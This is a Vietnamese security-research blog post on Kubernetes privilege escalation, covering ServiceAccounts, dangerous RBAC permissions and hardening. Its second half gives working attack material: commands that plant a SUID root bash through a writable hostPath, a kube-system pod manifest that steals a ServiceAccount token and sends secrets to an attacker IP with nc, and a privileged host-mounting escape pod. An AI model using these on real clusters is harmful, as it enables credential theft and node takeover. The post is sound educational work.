---
title: "Hacking Kubernetes (Part 1)"
date: 2026-05-26 00:00:00 +0700
categories: ["Security-Research"]
tags: ["Kubernetes", "Security"]
---


##  Các Attack vector trong Privilege Escalation in K8s


Trước khi đi sau vào kĩ thuật thì mình cũng muốn các bạn có thể hiểu được các khái niệm mà mình thấy là quan trọng để có thể khai thác các lỗ hổng về K8s.
### I. ServiceAccount là gì?

Trong Kubernetes, **ServiceAccount** cung cấp định danh cho các tiến trình chạy bên trong container . Khi người dùng cố gắng xác thực với với API K8s , người có chỉ cần certificate để xác minh danh tính của họ . Còn với một non-human resource như pod thì cần SA để có danh tính khi giao tiếp API server K8s . Một tiến trình bên trong Pod có thể sử dụng SA được liên kết với nó để xác thực với API server.

![](/assets/images/posts/Pasted%20image%2020260524220427.png)


Trong Kubernetes, cơ chế gán ServiceAccount (SA) mặc định hoạt động như sau:

- **Tự động gán:** Mỗi Namespace luôn có sẵn một SA tên là `default`.
- **Mặc định:** Nếu bạn không chỉ định `serviceAccountName` trong file cấu hình Pod, K8s sẽ tự động gán SA `default` này cho Pod đó.
- **Gắn Token:** K8s sẽ tự động mount một API token của SA này vào thư mục `/var/run/secrets/kubernetes.io/serviceaccount` bên trong Pod.

Ví dụ:

`Pod -> dùng ServiceAccount token -> gọi Kubernetes API Server`

Mặc định, Kubernetes thường mount thông tin ServiceAccount vào pod tại:

`/var/run/secrets/kubernetes.io/serviceaccount/`

Trong thư mục này thường có:

```
ca.crt      certificate để verify API server
namespace  namespace hiện tại của pod
token      bearer token của ServiceAccount
```


### II. RBAC là gì?
RBAC là viết tắt của **Role-Based Access Control**. Nó quyết định một identity được phép làm gì trong Kubernetes.

RBAC trả lời các câu hỏi kiểu:

ServiceAccount này có được get secrets không? 
ServiceAccount này có được list pods không? 
ServiceAccount này có được create deployments không? 
ServiceAccount này có được đọc secret trong namespace khác không?


![](/assets/images/posts/Pasted%20image%2020260524220317.png)


RBAC thường gồm 4 object chính:

`Role ,RoleBinding , ClusterRole, ClusterRoleBinding`

Trong K8s các thành phần này dùng để quản lí quyền hạn của người dùng và ứng dụng với các tài nguyên trong Cluster

Hiểu 1 cách đơn giản thì Role/ClusterRole : Dùng cho câu hỏi được làm gì ? (Định nghĩa quyền) còn binding thì trả lời cho câu hỏi ai được làm (gán quyền cho 1 người dùng cụ thể)

Role/Rolebiding : Dùng khi bạn muốn giới hạn quyền định ra trong 1 namespace nhất định

- Role : Tập hợp các quy tắc cho phép thực hiện 1 hành động (get,list,create,delete) trên các tài nguyên như Pod, Service trong 1 namespace
- Rolebiding : Liên kết 1 role với 1 object cụ thể như User , Group, hoặc Service Account) trong cùng 1 namespace đó .
Ví dụ như : Gán quyền "chỉ xem Pod" cho bạn An trong namespace `frontend`

ClusterRole và ClusterRoleBinding (Cấp độ Toàn Cụm): Dùng cho các tài nguyên **không thuộc Namespace** (như Nodes, PersistentVolumes) hoặc khi muốn cấp quyền trên **toàn bộ các Namespace**.

- **ClusterRole**: Định nghĩa quyền trên toàn cluster. Nó có thể dùng để phân quyền cho các tài nguyên chung của hệ thống.
- **ClusterRoleBinding**: Cấp quyền từ ClusterRole cho người dùng trên phạm vi toàn cụm, bất kể Namespace nào.

Các lệnh enum RBAC

```
# Get current privileges
kubectl auth can-i --list
# use `--as=system:serviceaccount:<namespace>:<sa_name>` to impersonate a service account

# List Cluster Roles
kubectl get clusterroles
kubectl describe clusterroles

# List Cluster Roles Bindings
kubectl get clusterrolebindings
kubectl describe clusterrolebindings

# List Roles
kubectl get roles
kubectl describe roles

# List Roles Bindings
kubectl get rolebindings
kubectl describe rolebindings
```


![](/assets/images/posts/Pasted%20image%2020260521224006.png)


Một số quyền hạn nguy hiểm nếu config ko chính xác sẽ có thể là 1 attack surface cho các attacker khai thác

1. Manipulate AuthN / AuthZ (Thao túng xác thực và ủy quyền)

Nhóm này cho phép kẻ tấn công thay đổi cách hệ thống nhận diện và cấp quyền:

- **impersonate**: Giả danh người dùng khác (có thể là admin).
- **escalate**: Tự nâng cấp quyền hạn của chính mình.
- **bind**: Tạo các liên kết quyền mới để cấp quyền cho tài khoản khác.

2. Remote Code Execution (Thực thi mã từ xa)

Nhóm này cho phép kẻ tấn công chạy lệnh trái phép bên trong các container:

- **create pods/exec**: Chạy lệnh trực tiếp vào một Pod đang hoạt động.
- **create nodes/proxy**: Kết nối trực tiếp đến các Node thông qua proxy để can thiệp sâu hơn.
- **control mutating webhooks**: Thay đổi cấu hình của các đối tượng ngay khi chúng vừa được tạo ra.

3. Acquire Tokens (Chiếm đoạt Token)

Nhóm này tập trung vào việc lấy các thông tin đăng nhập bí mật:

- **list secrets**: Đọc toàn bộ mật khẩu, API key lưu trong cluster.
- **create serviceaccounts/token**: Tự tạo token mới cho các tài khoản dịch vụ để duy trì quyền truy cập bền bỉ.

4. Steal Pods (Đánh cắp hoặc can thiệp Pod)

Nhóm này nhắm vào việc điều hướng hoặc phá hủy các ứng dụng đang chạy:

- **modify nodes**: Thay đổi cấu hình máy chủ để ép Pod chạy trên các nút bị kiểm soát.
- **delete pods/nodes**: Gây gián đoạn dịch vụ bằng cách xóa các thành phần quan trọng.



Trong bài viết **Kubernetes RBAC: Paths for Privilege Escalation** của Schutzwerk, tác giả chỉ ra một điểm rất quan trọng: RBAC đúng là lớp authorization để ngăn truy cập trái phép, nhưng một số quyền RBAC nếu cấp sai có thể biến chính cơ chế phân quyền này thành đường leo thang đặc quyền. Nói cách khác, vấn đề không nằm ở RBAC bị lỗi, mà nằm ở việc một identity như User, Group hoặc ServiceAccount được cấp những quyền quá mạnh so với nhu cầu thật sự.

Bài viết gom các đường leo thang đặc quyền trong RBAC vào một số nhóm quyền nguy hiểm chính:

- `create pods`
- `get/list secrets`
- `bind`
- `escalate`
- `impersonate`

Các quyền này nhìn riêng lẻ có thể có vẻ hợp lý trong vận hành, nhưng khi attacker chiếm được một identity có các quyền đó, chúng có thể trở thành attack path để đi từ quyền thấp lên quyền cao hơn.

#### 1. `create pods`: tạo Pod để chiếm token hoặc chạm tới Node

Quyền `create pods` nghe có vẻ bình thường vì Pod là đơn vị workload cơ bản trong Kubernetes. Tuy nhiên, RBAC chỉ kiểm tra identity đó có được phép tạo Pod hay không, chứ bản thân RBAC không kiểm tra Pod đó có cấu hình an toàn hay không. Nếu cluster thiếu Admission Controller hoặc policy chặn cấu hình nguy hiểm, attacker có thể tạo Pod với image, volume, `serviceAccountName`, securityContext hoặc host mount có lợi cho việc leo thang.

Có hai hướng nguy hiểm phổ biến:

- Tạo Pod dùng một ServiceAccount mạnh hơn trong cùng namespace, sau đó đọc token được mount trong `/var/run/secrets/kubernetes.io/serviceaccount/`.
- Tạo Pod có cấu hình quá mạnh như `privileged`, `hostPath`, `hostPID`, `hostNetwork`, từ đó tìm cách truy cập node hoặc đọc dữ liệu nhạy cảm trên host.

Điểm cần nhớ là `create pods` không chỉ là quyền deploy app. Trong một cluster cấu hình lỏng, nó có thể trở thành quyền để attacker tự tạo môi trường tấn công bên trong cluster.

![](/assets/images/posts/Pasted%20image%2020260526141008.png)


#### 2. `get/list secrets`: đọc Secret để chiếm credential

Secret trong Kubernetes thường chứa thông tin nhạy cảm như password database, API key, TLS key, kubeconfig hoặc token của ServiceAccount. Vì vậy, identity có quyền đọc Secret trong một namespace có thể lấy credential của workload khác rồi hành động với quyền của credential đó.

![](/assets/images/posts/Pasted%20image%2020260526141112.png)


Cần phân biệt `get` và `list`:

- `list secrets` cho phép liệt kê toàn bộ Secret trong phạm vi được cấp quyền, rất nguy hiểm vì attacker có thể thấy nhiều object cùng lúc.
- `get secrets` yêu cầu biết tên Secret cụ thể, nhưng vẫn nguy hiểm nếu attacker đoán được tên Secret hoặc lấy được tên từ manifest, log, config, GitOps repo hay output enum khác.

Trong các phiên bản Kubernetes cũ, token của ServiceAccount từng được tạo thành Secret với pattern dễ nhận biết. Vì vậy, nếu có quyền đọc Secret, attacker có thể chiếm token của ServiceAccount rồi gọi Kubernetes API với quyền của ServiceAccount đó. Với các cluster mới, cơ chế token đã thay đổi an toàn hơn, nhưng Secret vẫn là nơi cực kỳ nhạy cảm và không nên cấp quyền đọc rộng.


![](/assets/images/posts/Pasted%20image%2020260526141018.png)

#### 3. `impersonate`: giả danh identity khác

`impersonate` cho phép một identity gửi request tới API server dưới danh nghĩa user, group hoặc ServiceAccount khác. Cơ chế này hữu ích cho admin khi cần kiểm tra quyền, ví dụ test xem một ServiceAccount có thể làm gì. Nhưng nếu cấp sai, attacker có thể giả danh identity có quyền cao hơn.

Ví dụ về mặt khái niệm:

- Impersonate user admin để thực hiện hành động mà user hiện tại không có quyền.
- Impersonate group có quyền mạnh, ví dụ group được bind tới ClusterRole quan trọng.
- Impersonate ServiceAccount trong namespace nhạy cảm như monitoring, CI/CD hoặc kube-system.

Vì vậy, `impersonate` nên được xem là quyền cực kỳ nhạy cảm. Khi audit RBAC, cần kiểm tra không chỉ impersonate user, mà cả impersonate group và serviceaccounts.

![](/assets/images/posts/Pasted%20image%2020260526141100.png)
#### 4. `bind`: tự gán Role hoặc ClusterRole mạnh hơn

Thông thường, Kubernetes không cho một user tự bind một Role chứa quyền cao hơn quyền mà user đó đang có. Đây là cơ chế chống privilege escalation mặc định. Tuy nhiên, nếu identity có thêm quyền `bind`, nó có thể gán Role hoặc ClusterRole cho chính nó hoặc cho identity khác.

Có ba mức độ rủi ro:

- `create rolebindings` + `bind roles`: có thể gán các Role trong namespace cho chính mình.
- `create rolebindings` + `bind clusterroles`: có thể đem quyền từ ClusterRole áp vào một namespace cụ thể.
- `create clusterrolebindings` + `bind clusterroles`: có thể gán quyền ở phạm vi toàn cluster, rủi ro cao nhất.

Nếu attacker bind được ClusterRole như `cluster-admin` vào ServiceAccount mình kiểm soát, coi như attacker đã chiếm quyền quản trị cluster.

![](/assets/images/posts/Pasted%20image%2020260526141144.png)
#### 5. `escalate`: sửa Role/ClusterRole để thêm quyền mình chưa có

Kubernetes cũng có cơ chế chặn user tạo hoặc sửa Role chứa quyền mà bản thân user chưa sở hữu. Nhưng quyền `escalate` được thiết kế để bypass cơ chế này cho các trường hợp admin hợp lệ cần quản lý RBAC.

![](/assets/images/posts/Pasted%20image%2020260526141202.png)


Nếu attacker có quyền `create/update roles` hoặc `create/update clusterroles` cộng thêm `escalate`, attacker có thể sửa Role/ClusterRole đang được gán cho mình để thêm quyền mới, ví dụ thêm `get secrets`, `create pods`, `bind`, hoặc thậm chí quyền wildcard `*`.

Nói ngắn gọn:

`bind` nguy hiểm vì cho phép gán quyền mạnh có sẵn.  
`escalate` nguy hiểm vì cho phép tạo hoặc sửa quyền mạnh hơn quyền hiện tại.


#### Tóm tắt attack path

Một chuỗi RBAC privilege escalation thực tế thường có dạng:

```text
Compromise pod/app
-> lấy ServiceAccount token
-> kubectl auth can-i --list
-> phát hiện quyền nguy hiểm
-> đọc Secret / tạo Pod / impersonate / bind / escalate
-> chiếm ServiceAccount hoặc Role mạnh hơn
-> mở rộng quyền trong namespace hoặc toàn cluster
```

Điểm hay của bài Schutzwerk là nó không xem RBAC privilege escalation như một lỗi đơn lẻ, mà xem nó như một tập hợp các permission có thể nối lại thành attack path. Chỉ cần một ServiceAccount bị cấp thừa quyền và workload bị compromise, attacker có thể dùng chính Kubernetes API để leo thang thay vì cần khai thác CVE phức tạp.

#### Phòng thủ và hardening

Để giảm rủi ro RBAC privilege escalation, có thể áp dụng các hướng sau:

- Áp dụng least privilege cho User, Group và ServiceAccount.
- Không cấp wildcard `*` cho `apiGroups`, `resources` hoặc `verbs` nếu không thật sự cần.
- Hạn chế nghiêm ngặt các quyền `bind`, `escalate`, `impersonate`.
- Không cấp `get/list secrets` rộng cho workload thông thường.
- Kiểm soát quyền `create pods`, vì quyền này có thể bị biến thành pod-to-node hoặc pod-to-token attack path.
- Tắt `automountServiceAccountToken` với Pod không cần gọi Kubernetes API.
- Dùng Admission Controller như Pod Security Admission, Kyverno hoặc OPA Gatekeeper để chặn Pod nguy hiểm.
- Audit định kỳ bằng các công cụ như `kubectl auth can-i --list`, KubiScan, rbac-tool hoặc kubeaudit.
- Theo dõi audit log cho các hành động nhạy cảm như tạo RoleBinding, ClusterRoleBinding, impersonate request, đọc Secret hoặc tạo Pod bất thường.

Nguồn tham khảo: [Schutzwerk - Kubernetes RBAC: Paths for Privilege Escalation](https://www.schutzwerk.com/blog/kubernetes-privilege-escalation-01/)



Dưới đây là 1 bài tập mà mình tìm được về KillerConda để có thể demo cách config về RBAC

![](/assets/images/posts/Pasted%20image%2020260521211943.png)



![](/assets/images/posts/Pasted%20image%2020260521212922.png)

Câu 1 : Cái này thì bạn tạo ra các resource cùng với cái verb thực hiện resource đó trong 1 namepace là application

![](/assets/images/posts/Pasted%20image%2020260521213612.png)

Câu 2 : Sau khi tạo role thì bạn rolebinding gắn các quyền vào các role đó
![](/assets/images/posts/Pasted%20image%2020260521214129.png)


Câu 3 : Kiểm tra lại các quyền mà ta có thể làm
![](/assets/images/posts/Pasted%20image%2020260521215047.png)


## III . Nghiên cứu các kĩ thuật leo thang đặc quyền trong K8s


### 1. Attacking Kubernetes from inside a Pod

![](/assets/images/posts/Pasted%20image%2020260522162103.png)

Khi attacker chiếm được shell trong 1 Pod , container đó trở thành 1 chỗ đứng ở bên trong K8s cluster . Từ đây mục đích của các attacker là thoát khỏi Pod từ Node đó bằng cách kiểm tra quyền của Pod , tìm token , dò các service nội bộ , kiểm tra volume mount ,...

Pod escape : Là quá trình attacker thoát khỏi phạm vi container /Pod để truy cập vào các Node . Tất nhiên là không phải Pod nào cũng escape được , tùy thuộc cái cách Pod đó được config như Pod đó có Privileged mode không , hostPath mount , hostPID, hostNetwork , Linux capabilities hoặc container runtime bị expose,...


Đây là ví dụ điển hình của misconfiguration trong Kubernetes. Một cấu hình volume tưởng như phục vụ vận hành có thể trở thành đường dẫn để attacker đi từ container ra Node.

### a) Abusing  writeable hostPath/bind mounts (Container -> host root via SUID planting)


Trước khi đi sau vào kĩ thuật tấn công thì giới thiệu sơ qua về khái niệm hostPath

Trong Kubernetes, hostPath volume là cơ chế cho phép bạn gắn (mount) trực tiếp một tập tin hoặc thư mục từ hệ thống tập tin (filesystem) của máy chủ (Worker Node) vào bên trong một Pod.

 Đặc điểm cốt lõi

- **Lưu trữ cục bộ:** Dữ liệu được lưu thẳng trên ổ cứng của Node vật lý (hoặc máy ảo) đang chạy Pod.
- **Độ bền (Persistence):** Dữ liệu không bị mất khi container trong Pod bị khởi động lại hoặc bị xóa.
- **Tính ràng buộc (Node-specific):** Vì gắn với một Node cụ thể, nếu Pod bị tắt và được lên lịch (schedule) lại sang một Node khác, nó sẽ không thể truy cập được dữ liệu cũ trừ khi Node mới có cấu trúc thư mục y hệt

Thông thường , `hostPath` thường được áp dụng cho các trường hợp đặc thù như:

- Chạy các ứng dụng cần đọc hoặc ghi vào log hệ thống của Node.
- Cần truy cập các socket Docker daemon (ví dụ: `/var/run/docker.sock`) từ bên trong Pod.
- Thực hiện các tác vụ giám sát (monitoring) hoặc quản lý cluster yêu cầu quyền truy cập sâu vào filesystem của Node


Nếu một Pod hoặc container bị compromise có 1 volume ghi được ánh xạ trực tiếp đến host filesystem (K8s hostPath hoặc là Docker bindmount ), và bạn có thể trở thành root bên trong container  , bạn có thể tận dụng mount đó để có thể tạo ra 1 setuid-root binary trên host và sau đó thực thi  nó từ máy chủ để lấy quyền root

Key conditions :

-  Volume mount từ host vào container có quyền ghi
- Filesystem host không bật cơ chế chặn kiểu `nosuid`.
- Attacker có cách khiến file được ghi trên host nếu file được thực thi 


Cách xác định hostPath/bind mounts có thể được ghi 

- With kubectl , thì bạn có check bằng lệnh sau 
```
kubectl get pod -o jsonpath='{.specvolumes[*].hostPath.path}'
```

- Từ bên trong container , list mount và tìm kiếm host-path mounts 

```
# Inside the compromised container
mount | column -t

cat /proc/self/mountinfo | grep -E 'host-path|kubernetes.io~host-path' || true

findmnt -T / 2>/dev/null | sed -n '1,200p'

# Test if a specific mount path is writable
TEST_DIR=/var/www/html/some-mount  # replace with your suspected mount path
[ -d "$TEST_DIR" ] && [ -w "$TEST_DIR" ] && echo "writable: $TEST_DIR"

# Quick practical test
printf "ping\n" > "$TEST_DIR/.w"

```

Plant a setuid root binary from the container:


```
# As root inside the container, copy a static shell (or /bin/bash) into the mounted path and set SUID/SGID

MOUNT="/var/www/html/survey"   # path inside the container that maps to a host directory

cp /bin/bash "$MOUNT/suidbash"
chmod 6777 "$MOUNT/suidbash"
ls -l "$MOUNT/suidbash"

# -rwsrwsrwx 1 root root 1234376 ... /var/www/html/survey/suidbash


```


```
# On the host, locate the mapped path (e.g., from the Pod spec .spec.volumes[].hostPath.path or by prior enumeration)
# Example host path: /opt/limesurvey/suidbash
ls -l /opt/limesurvey/suidbash
/opt/limesurvey/suidbash -p   # -p preserves effective UID 0 in bash

```


### Lưu ý khi khai thác writable hostPath

Kỹ thuật writable hostPath không phải lúc nào cũng dẫn tới leo thang đặc quyền ngay lập tức. Một ví dụ phổ biến là attacker ghi một SUID binary vào thư mục được mount từ host. Về lý thuyết, nếu binary này thuộc sở hữu của root và có SUID bit, khi được thực thi trên host nó có thể chạy với effective UID là root.

Tuy nhiên, kỹ thuật này phụ thuộc vào mount option của filesystem. Nếu filesystem trên host được mount với option `nosuid`, Linux sẽ bỏ qua SUID/SGID bit. Khi đó, mặc dù file hiển thị có quyền SUID, nó cũng không thể được dùng để nâng quyền. Bạn có thể check mount option trên host bằng (cat /proc/mounts | grep ) and  kiếm nosuid.

Ngoài ra, attacker cần có cách để khiến file đã ghi được thực thi từ phía host. Nếu chỉ có quyền ghi từ container nhưng không có user shell, cron job, systemd service hoặc process nào trên host chạy file đó, thì việc “plant” SUID binary chỉ dừng lại ở việc đặt file lên host filesystem, chưa đủ để chiếm quyền.

Tuy nhiên, writable hostPath vẫn là một rủi ro nghiêm trọng nếu đường dẫn được mount là thư mục nhạy cảm. Ví dụ, nếu mount trỏ tới `/root/.ssh`, attacker có thể ghi thêm SSH key; nếu mount trỏ tới `/etc/cron.d`, attacker có thể tạo cron job; nếu mount trỏ tới `/etc/systemd/system`, attacker có thể đặt service persistence. Vì vậy, mức độ nguy hiểm của writable hostPath phụ thuộc rất lớn vào host path cụ thể được mount vào Pod.

 Kỹ thuật này cũng hoạt động với các bind mount thông thường của Docker; trong Kubernetes, nó thường là một volume hostPath (readOnly: false) hoặc một subPath có phạm vi không chính xác.


### b) Abusing Roles/ClusterRoles in Kubernetes

Như trong phần ServiceAccount mình có viết ở trên thì đa số các Pod chạy với service account token trong nó . Đôi khi SA này được cấu hình ko đúng nên chúng ta thường sẽ tận dụng tận dụng SA có 1 số đặc quyền này để có thể khai thác 

![](/assets/images/posts/Pasted%20image%2020260522174411.png)


Privilege Escalation trong Kubernetes có thể hiểu là quá trình attacker tìm cách chuyển từ quyền hiện tại sang một identity khác có quyền cao hơn. Identity này có thể là user, group, ServiceAccount trong cluster, hoặc trong một số trường hợp là quyền cloud IAM bên ngoài nếu cluster chạy trên AWS, GCP hoặc Azure.

Khác với privilege escalation trên Linux truyền thống, trong Kubernetes attacker không chỉ cố gắng leo từ user thường lên root trong một máy. Mục tiêu có thể là chiếm được ServiceAccount mạnh hơn, đọc được Secret nhạy cảm, tạo Pod với cấu hình nguy hiểm, truy cập Node, hoặc lợi dụng quyền cloud gắn với workload hoặc node.

Trong Kubernetes, có bốn hướng leo thang đặc quyền phổ biến:

1. **Impersonation**  
   Attacker có quyền giả mạo user, group hoặc ServiceAccount khác. Nếu identity bị impersonate có quyền cao hơn, attacker có thể hành động với quyền của identity đó.

2. **Create / Patch / Exec Pod**  
   Attacker có quyền tạo, sửa hoặc exec vào Pod. Nếu có thể tạo Pod dùng ServiceAccount mạnh hơn, mount secret, hoặc chạy Pod với cấu hình privileged, attacker có thể mở rộng quyền trong cluster.

3. **Read Secrets**  
   Kubernetes Secret có thể chứa ServiceAccount token, password, kubeconfig hoặc credential ứng dụng. Nếu attacker có quyền `get` hoặc `list` Secret, họ có thể lấy credential để impersonate identity khác.

4. **Escape từ container ra Node**  
   Nếu Pod được cấu hình quá nguy hiểm, ví dụ privileged, hostPID, hostNetwork hoặc mount hostPath, attacker có thể thoát khỏi container để truy cập Node. Khi đã vào Node, attacker có thể tìm token của các Pod khác, kubelet credential hoặc cloud metadata credential.

Ngoài bốn hướng chính trên, một quyền đáng chú ý khác là `port-forward`. Nếu attacker có quyền port-forward tới Pod, họ có thể truy cập các service nội bộ vốn không được expose ra ngoài.


### Wildcard Permission: quyền quá rộng trong RBAC

Trong RBAC, wildcard `*` là một cấu hình rất nguy hiểm nếu được cấp sai đối tượng. Wildcard có thể xuất hiện ở `apiGroups`, `resources` hoặc `verbs`.

Ví dụ:

```
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

```


Cấu hình này có nghĩa là identity được cấp quyền có thể thực hiện mọi hành động trên mọi loại tài nguyên thuộc mọi API group. Nếu quyền này nằm trong ClusterRole, phạm vi ảnh hưởng không chỉ giới hạn trong một namespace mà có thể áp dụng trên toàn cluster.

Đây thường là quyền dành cho admin hoặc controller hệ thống có nhu cầu đặc biệt. Nếu một ServiceAccount của workload thông thường được gán quyền wildcard, attacker chỉ cần compromise Pod sử dụng ServiceAccount đó là có thể có gần như toàn quyền thao tác với cluster.


Một biến thể khác là wildcard resource nhưng giới hạn verb:

```
apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```


Nhìn qua có vẻ ít nguy hiểm hơn verbs: ["*"], nhưng vẫn tạo ra rủi ro lớn:

- create: có thể tạo tài nguyên mới, bao gồm Pod hoặc RoleBinding nếu không bị giới hạn.
- list: có thể liệt kê tài nguyên trong cluster, làm lộ cấu trúc hệ thống.
- get: có thể đọc tài nguyên nhạy cảm, đặc biệt là Secret.

Vì vậy, khi đánh giá RBAC, không chỉ cần tìm quyền *, mà còn cần xem quyền đó áp dụng lên resource nào và ở phạm vi namespace hay cluster.


### Pod Create - Steal Token 

Một quyền tưởng như bình thường nhưng rất nguy hiểm trong Kubernetes là `create pods`. Nếu attacker có quyền tạo Pod trong một namespace, họ có thể cố gắng tạo Pod mới sử dụng một ServiceAccount khác trong cùng namespace.

Nếu ServiceAccount đó có quyền cao hơn, token của nó sẽ được mount vào Pod mới. Khi attacker điều khiển container trong Pod này, họ có thể đọc token và dùng nó để gọi Kubernetes API với quyền của ServiceAccount mạnh hơn.


Ví dụ về một pod sẽ đánh cắp token của `bootstrap-signer`tài khoản dịch vụ và gửi nó cho kẻ tấn công:

```
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
    - name: alpine
      image: alpine
      command: ["/bin/sh"]
      args:
        [
          "-c",
          'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
        ]
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true

```

Nói đơn giản: nếu attacker có quyền **tạo Pod trong namespace kube-system**, attacker có thể tạo một Pod mới và bắt Pod đó chạy bằng ServiceAccount tên bootstrap-signer. Khi Pod chạy, Kubernetes sẽ tự mount token của ServiceAccount đó vào trong container. Sau đó command bên trong container đọc token này và dùng nó để gọi API Server.

 Giải thích từng phần

`metadata: name: alpine namespace: kube-system`

Tạo Pod tên alpine trong namespace kube-system.

Namespace này nhạy cảm vì thường chứa các component hệ thống hoặc ServiceAccount quan trọng.

```
image: alpine 
command: ["/bin/sh"]
```

Pod dùng image Alpine và chạy shell.

```
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
```

Đây là phần quan trọng nhất.

Nó bảo Kubernetes chạy Pod này với ServiceAccount bootstrap-signer.

Khi automountServiceAccountToken: true, token của ServiceAccount đó sẽ được mount vào container tại:

`/run/secrets/kubernetes.io/serviceaccount/token`

Tức là bên trong container có thể đọc được token này.

`cat /run/secrets/kubernetes.io/serviceaccount/token`

Lệnh này đọc token của ServiceAccount bootstrap-signer.

```
curl -k -v \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets
```

Lệnh này dùng token vừa đọc để gọi Kubernetes API.

Cụ thể nó đang thử truy cập endpoint liệt kê Secret trong namespace kube-system.

Nếu ServiceAccount bootstrap-signer có quyền đọc Secret, API Server sẽ trả về dữ liệu Secret.

`| nc -nv 192.168.154.228 6666`

Phần này gửi output ra máy attacker ở IP 192.168.154.228, port 6666.

Nói cách khác:

`Đọc token -> dùng token gọi API -> gửi kết quả về attacker`

`hostNetwork: true`

Pod dùng network namespace của Node.

Điều này có thể giúp Pod truy cập network giống như Node, đôi khi bypass một số giới hạn network hoặc truy cập được endpoint mà Pod thường không truy cập được.


Điểm quan trọng ở đây là attacker không cần biết password hay private key của ServiceAccount. Kubernetes tự động mount token vào Pod nếu automountServiceAccountToken được bật.

### Điều kiện cần có

- Attacker có quyền create pods.
- Namespace tồn tại ServiceAccount có quyền cao hơn.
- Admission policy không chặn việc gắn ServiceAccount đó.
- Token được mount vào Pod.

### Phòng thủ

- Không cấp quyền create pods quá rộng.
- Không để ServiceAccount mạnh nằm trong namespace có workload kém tin cậy.
- Tắt automountServiceAccountToken nếu Pod không cần gọi Kubernetes API.
- Dùng RBAC least privilege.
- Dùng admission controller như Kyverno, OPA Gatekeeper hoặc Pod Security Admission để kiểm soát ServiceAccount được phép sử dụng.


## Pod Create & Escape



Nếu attacker có quyền tạo Pod và cluster không có chính sách Pod Security chặt chẽ, họ có thể tạo một Pod với cấu hình nguy hiểm để tiếp cận Node.

Một số cấu hình đặc biệt nguy hiểm gồm:

| Cấu hình | Ý nghĩa | Rủi ro |
|---|---|---|
| `privileged: true` | Container được cấp quyền gần như tương đương host | Có thể tương tác sâu với kernel, device, container runtime |
| `hostPID: true` | Pod dùng PID namespace của host | Có thể nhìn thấy process trên Node |
| `hostNetwork: true` | Pod dùng network namespace của host | Có thể truy cập network như Node, ảnh hưởng NetworkPolicy |
| `hostIPC: true` | Pod dùng IPC namespace của host | Có thể truy cập shared memory hoặc IPC resource |
| `hostPath: /` | Mount filesystem gốc của Node vào container | Có thể đọc/sửa file trên Node nếu có quyền |

Nếu nhiều cấu hình nguy hiểm được kết hợp, Pod có thể trở thành cầu nối để attacker escape ra Node.

```
apiVersion: v1
kind: Pod
metadata:
  name: ubuntu
  labels:
    app: ubuntu
spec:
  # Uncomment and specify a specific node you want to debug
  # nodeName: <insert-node-name-here>
  containers:
    - image: ubuntu
      command:
        - "sleep"
        - "3600" # adjust this as needed -- use only as long as you need
      imagePullPolicy: IfNotPresent
      name: ubuntu
      securityContext:
        allowPrivilegeEscalation: true
        privileged: true
        #capabilities:
        #  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
        runAsUser: 0 # run as root (or any other user)
      volumeMounts:
        - mountPath: /host
          name: host-volume
  restartPolicy: Never # we want to be intentional about running this pod
  hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
  hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
  hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
  volumes:
    - name: host-volume
      hostPath:
        path: /

```


## Giải thích từng phần

```
`apiVersion: v1 
kind: Pod 
metadata: 
name: ubuntu`
```

Tạo một Pod tên ubuntu.

`containers: - image: ubuntu command: - "sleep" - "3600"`

Container dùng image Ubuntu và chỉ chạy sleep 3600 để giữ Pod sống trong 1 giờ. Sau khi Pod chạy, attacker có thể exec vào container để thao tác thủ công.

```
securityContext:
  allowPrivilegeEscalation: true
  privileged: true
  runAsUser: 0
```

Đây là phần rất nguy hiểm.

- runAsUser: 0: container chạy bằng user root.
- allowPrivilegeEscalation: true: cho phép process trong container leo quyền thông qua cơ chế như SUID hoặc file capability.
- privileged: true: container được cấp quyền rất cao, gần với quyền của host. Nhiều lớp cô lập bảo mật của container bị nới lỏng.

Nói ngắn gọn: container này không còn là workload bình thường nữa, mà là một container có quyền hệ thống rất mạnh.

```
volumeMounts:
  - mountPath: /host
    name: host-volume
```

Mount một volume vào trong container tại đường dẫn /host.

Phần volume được định nghĩa bên dưới:

```
volumes:
  - name: host-volume
    hostPath:
      path: /
```

hostPath.path: / nghĩa là mount toàn bộ filesystem gốc của Node vào container.

Tức là:

`Trong container: /host ,Thực tế là: / của Node`

Vì vậy, khi attacker vào container và đọc /host/etc, thực chất là đang đọc /etc của Node.

Ví dụ:

`/host/etc/kubernetes/ /host/var/lib/kubelet/ /host/root/ /host/home/`

Đây là một trong những cấu hình hostPath nguy hiểm nhất.

`hostIPC: true`

Container dùng IPC namespace của host.

IPC là cơ chế giao tiếp giữa các process như shared memory, semaphore, message queue. Nếu dùng IPC namespace của host, container có thể nhìn thấy hoặc tương tác với một số IPC resource của Node.

`hostNetwork: true`

Container dùng network namespace của host.

Điều này có nghĩa là Pod dùng network stack của Node, không phải network riêng của Pod. Nó có thể:

- Nhìn network từ góc nhìn của Node.
- Truy cập các service chỉ bind trên Node network.
- Có khả năng bypass một số NetworkPolicy tùy CNI.
- Truy cập metadata endpoint trong môi trường cloud dễ hơn.

`hostPID: true`

Container dùng PID namespace của host.

